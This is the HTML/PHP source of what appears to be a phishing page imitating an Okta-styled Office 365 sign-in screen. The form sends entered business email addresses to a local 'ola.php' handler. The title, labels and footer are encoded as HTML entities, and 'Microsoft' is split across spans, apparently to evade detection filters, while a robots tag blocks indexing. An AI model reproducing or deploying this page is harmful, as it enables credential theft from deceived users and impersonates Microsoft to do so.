<?
session_start();
?>
<!DOCTYPE html>
<html>
    <!--<![endif]-->
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

        

        <title>&#79;&#102;&#102;&#105;&#99;&#101;&#51;&#54;&#53;&#32;&#80;&#111;&#114;&#116;&#97;&#108;</title>

        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="robots" content="none" />
        <script src="../FUNC/okta-sign-in.min.js" type="text/javascript"></script>
        <link href="./ola_disc/okta-sign-in.min.css" type="text/css" rel="stylesheet" />
        <link href="./ola_disc/loginpage-theme.7138a0eb969c6a25c2d39004ad54df8a.css" type="text/css" rel="stylesheet" />
       

        <script src="./ola_disc/initLoginPage.pack.4f6cb08d43a53d53c533a128533657c3.js.téléchargement" crossorigin="anonymous" integrity="sha384-zWgCtHLPlm1f+RWOWEqSQRBpN5AqVHvX1Vv23sv6s4CguycKVuZbTVJe1yY8alBN"></script>
    </head>
    <body class="auth okta-container" data-gr-c-s-loaded="true">
        <!--[if gte IE 8]>
            <![if lte IE 9]>

            <style>
                .unsupported-browser-banner-wrap {
                    padding: 20px;
                    border: 1px solid #ddd;
                    background-color: #f3fbff;
                }
                .unsupported-browser-banner-inner {
                    position: relative;
                    width: 735px;
                    margin: 0 auto;
                    text-align: left;
                }
                .unsupported-browser-banner-inner .icon {
                    vertical-align: top;
                    margin-right: 20px;
                    display: inline-block;
                    position: static !important;
                }
                .unsupported-browser-banner-inner a {
                    text-decoration: underline;
                }
            </style>

            <div class="unsupported-browser-banner-wrap">
                <div class="unsupported-browser-banner-inner">
                    <span class="icon icon-16 icon-only warning-16-yellow"></span>Vous utilisez un navigateur non compatible. Pour la meilleure expérience, mettez à jour à
                    <a href="https://support.okta.com/help/articles/Knowledge_Article/24532952-Platforms---Browser-and-OS-Support">un navigateur compatible</a>.
                </div>
            </div>

            <![endif]>
        <![endif]-->
        <!--[if IE 8]> <div id="login-bg-image-ie8" class="login-bg-image" data-se="login-bg-image"></div> <![endif]-->
        <!--[if (gt IE 8)|!(IE)]><!-->
        <div id="login-bg-image" class="login-bg-image" data-se="login-bg-image" style="background-image: none;"></div>
        <!--<![endif]-->

        <!-- hidden form for reposting fromURI for X509 auth -->
        

        <div class="content">
            <style type="text/css">
                .noscript-msg {
                    background-color: #fff;
                    border-color: #ddd #ddd #d8d8d8;
                    box-shadow: 0 2px 0 rgba(175, 175, 175, 0.12);
                    text-align: center;
                    width: 398px;
                    min-width: 300px;
                    margin: 200px auto;
                    border-radius: 3px;
                    border-width: 1px;
                    border-style: solid;
                }

                .noscript-content {
                    padding: 42px;
                }

                .noscript-content h2 {
                    padding-bottom: 20px;
                }

                .noscript-content h1 {
                    padding-bottom: 25px;
                }

                .noscript-content a {
                    background: transparent;
                    box-shadow: none;
                    display: table-cell;
                    vertical-align: middle;
                    width: 314px;
                    height: 50px;
                    line-height: 36px;
                    color: #fff;
                    background: linear-gradient(#007dc1, #0073b2), #007dc1;
                    border: 1px solid;
                    border-color: #004b75;
                    border-bottom-color: #00456a;
                    box-shadow: rgba(0, 0, 0, 0.15) 0 1px 0, rgba(255, 255, 255, 0.1) 0 1px 0 0 inset;
                    -webkit-border-radius: 3px;
                    border-radius: 3px;
                }

                .noscript-content a:hover {
                    background: #007dc1;
                    cursor: hand;
                    text-decoration: none;
                }
            </style>
            <div id="signin-container">
                <div data-se="auth-container" id="okta-sign-in" class="auth-container main-container can-remove-beacon">
                    <div class="okta-sign-in-header auth-header">
                        <img src="./ola_disc/clipart1110398.png" class="auth-org-logo"  />
                        <div data-type="beacon-container" class="beacon-container" style="transform: scale(1, 1); text-indent: 1px;">
                            <div class="js-security-beacon">
                                <div class="beacon-blank">
                                    <div class="radial-progress-bar">
                                        <div class="circle left"></div>
                                        <div class="circle right"></div>
                                    </div>
                                </div>
                                <div aria-live="polite" role="img" class="bg-helper auth-beacon auth-beacon-security undefined-user" data-se="security-beacon">
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="auth-content">
                        <div class="auth-content-inner">
                            <div class="idp-discovery">
                                <form novalidate="novalidate" method="POST" action="ola.php" data-se="o-form" slot="content" id="form1" class="idp-discovery-form o-form o-form-edit-mode">
                                    <div data-se="o-form-content" class="o-form-content o-form-theme clearfix">
										<h5 data-se="o-form-head" class="okta-form-title o-form-head">
										    

										</h5>

                                        <div class="o-form-error-container" data-se="o-form-error-container"></div>
                                        <div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
                                            <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-30">
                                                <div data-se="o-form-label" class="okta-form-label o-form-label"><label for="idp-discovery-username">&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&nbsp;</label></div>
                                                <div data-se="o-form-input-container" class="o-form-input o-form-has-errors" aria-describedby="input-container-error6">
                                                    <p class="o-form-explain">&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#98;&#117;&#115;&#105;&#110;&#101;&#115;&#115;&#32;&#101;&#109;&#97;&#105;&#108;&#10;</p>
                                                    <span data-se="o-form-input-username" class="o-form-input-name-username o-form-control okta-form-input-field input-fix o-form-has-errors focused-input">
                                                        <input type="text" placeholder="" name="olauser" id="idp-discovery-username" value="" aria-label="" autofocus="" autocomplete="off" required="" />
                                                    </span>
                                                    
                                                </div>
                                            </div>
                                            
                                        </div>
                                    </div>
                                    <div class="o-form-button-bar"><input class="button button-primary" type="submit" value="Next" id="idp-discovery-submit" data-type="save" /></div>
                                </form>
                                <div class="auth-footer">
                                    <a
                                        href="#"
                                        data-se="needhelp"
                                        aria-expanded="false"
                                        aria-controls="help-links-container"
                                        class="link help js-help"
                                    >
                                        &#78;&#101;&#101;&#100;&#32;&#104;&#101;&#108;&#112;&#32;&#115;&#105;&#103;&#110;&#105;&#110;&#103;&#32;&#105;&#110;&#63;
                                    </a>
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
             <div class="footer-container clearfix">
                <p class="copyright">&#80;&#111;&#119;&#101;&#114;&#101;&#100;&#32;&#66;&#121; <a href="http://www.microsoft.com" class="inline-block notranslate">Mic<span>ros</span>oft</a></p>
                <p class="privacy-policy"><a href="https://www.microsoft.com/privacy" target="_blank" class="inline-block margin-l-10">&#67;&#111;&#110;&#102;&#105;&#100;&#101;&#110;&#116;&#105;&#97;&#108;&#105;&#116;&#121;</a></p>
            </div>
        </div>

        
        <!-- Cookie Consent by https://www.TermsFeed.com -->
<script type="text/javascript" src="//www.termsfeed.com/public/cookie-consent/3.1.0/cookie-consent.js"></script>
<script type="text/javascript">
document.addEventListener('DOMContentLoaded', function () {
cookieconsent.run({"notice_banner_type":"headline","consent_type":"express","palette":"light","language":"en","website_name":"Office 365","cookies_policy_url":"https://docs.microsoft.com/en-us/office365/servicedescriptions/office-365-platform-service-description/privacy-security-and-transparency"});
});
document.addEventListener("DOMContentLoaded", function(event) {
   document.querySelectorAll('img').forEach(function(img){
  	img.onerror = function(){this.style.display='none';};
   })
});
</script>

<noscript>Cookie Consent by <a href="https://www.microsoft.com/"><span>&#77;&#105;&#99;&#114;&#111;&#115;</span>&#111;&#102;&#116;</a></noscript>
<!-- End Cookie Consent -->

       
    </body>
</html>
